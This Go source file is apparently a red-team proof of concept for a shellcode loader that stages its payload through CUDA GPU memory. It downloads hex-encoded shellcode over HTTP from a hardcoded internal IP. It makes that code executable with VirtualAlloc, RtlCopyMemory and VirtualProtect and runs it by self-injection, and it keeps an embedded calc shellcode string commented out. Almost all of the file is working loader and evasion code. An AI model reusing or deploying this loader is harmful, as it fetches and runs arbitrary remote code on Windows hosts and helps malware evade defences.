package main

import (
	"C"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"
	"syscall"
	"unsafe"

	"github.com/barnex/cuda5/cu"
	"golang.org/x/sys/windows"
)
import "time"

func RtlCopyMemory(dest uintptr, src uintptr, len uint32) (err error) {
	var ntdll = windows.NewLazySystemDLL("ntdll.dll")
	rtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	_, _, err = rtlCopyMemory.Call(dest, src, uintptr(len))
	if err != windows.Errno(0) {
		err = fmt.Errorf("there was an error calling Windows RtlCopyMemory function: %s", err)
	} else {
		err = nil
	}
	return
}

func asyncExec(addr uintptr) {
	_, _, err := syscall.SyscallN(addr, 0)
	if err != syscall.Errno(0) {
		fmt.Println("Exec:", err)
		return
	}
}

func main() {

	// This must be called if this is the first time the API is being called
	// Must always be zero
	cu.Init(0)

	fmt.Println("Hello, I am you GPU:", cu.Device(0).Name())
	fmt.Println("Number of devices: " + strconv.Itoa(cu.DeviceGetCount()))
	fmt.Println("Free memory: " + strconv.FormatInt(cu.DeviceGet(0).TotalMem(), 10))
	fmt.Println()
	/*
		Context is how the API wrapper communicates with the driver API,
		This is needed to be established in order to communicate from the CPU to the GPU
	*/

	// Set current context
	ctx := cu.CtxCreate(cu.CTX_SCHED_AUTO, 0)
	cu.CtxSetCurrent(ctx)
	fmt.Println("[+] Created CUDA context")

	// Allocate 2048 bytes in the GPU
	fmt.Println("[+] Attepmting to allocate memory...")
	Memptr := cu.MemAlloc(2048)
	fmt.Println("[+] Allocated memory pointer", Memptr)

	// MemCpy to device
	fmt.Println("[+] Writing data to newly allocated memory...")
	url := "http://172.30.141.16/calc.bin"
	response, httpErr := http.Get(url)
	if httpErr != nil {
		fmt.Println("Error", httpErr)

	}
	defer response.Body.Close()

	hexShellcode, fileErr := io.ReadAll(response.Body)
	if fileErr != nil {
		fmt.Println(fileErr)
	}

	shellcode, hexErr := hex.DecodeString(strings.TrimSuffix(string(hexShellcode), "\n"))
	if hexErr != nil {
		fmt.Println(hexErr)
	}

	/* 	shellcode, fileErr := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	   	if fileErr != nil {
	   		fmt.Println(fileErr)
	   	} */

	cShellcode := C.CBytes(shellcode)

	cu.CtxSetCurrent(ctx)
	cu.MemcpyHtoD(Memptr, cShellcode, 1024)

	// Copy data from GPU to host
	var data2 string
	cu.MemcpyDtoH(unsafe.Pointer(&data2), Memptr, 1024)
	//fmt.Println("[+] Reading data from", Memptr, "...")
	//fmt.Println(data2)

	// Execute command that resides in GPU memeory via self injection
	fmt.Println("[+] Executing command from GPU memory...")
	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		fmt.Println("VirtualAlloc:", err)
		return
	}
	fmt.Printf("%p\n", unsafe.Pointer(addr))
	err = RtlCopyMemory(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uint32(len(shellcode)))
	if err != nil {
		fmt.Println("RtlCopyMemory:", err)
		return
	}

	var lpflOldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &lpflOldProtect)
	if err != nil {
		fmt.Println("VirtualProtect:", err)
		return
	}

	// Execute the shellcode
	go asyncExec(addr)
	time.Sleep(time.Second * 3)

	// Free memory to get rid of shellcode
	err = windows.VirtualFree(addr, 0, 0x00008000)
	if err != nil {
		fmt.Println("VirtualFree:", err)
	}
	//time.Sleep(time.Second * 1000)

	//out, _ := exec.Command("C:\\windows\\system32\\cmd.exe", "/c", data2).Output()
	//fmt.Printf("%s", out)

	// Free the newly created mem
	fmt.Println("[+] Attempting to free allocated memory at", Memptr, "...")
	cu.MemFree(Memptr)
	fmt.Println("[+] Successfully free'd the allocated mem!")
}
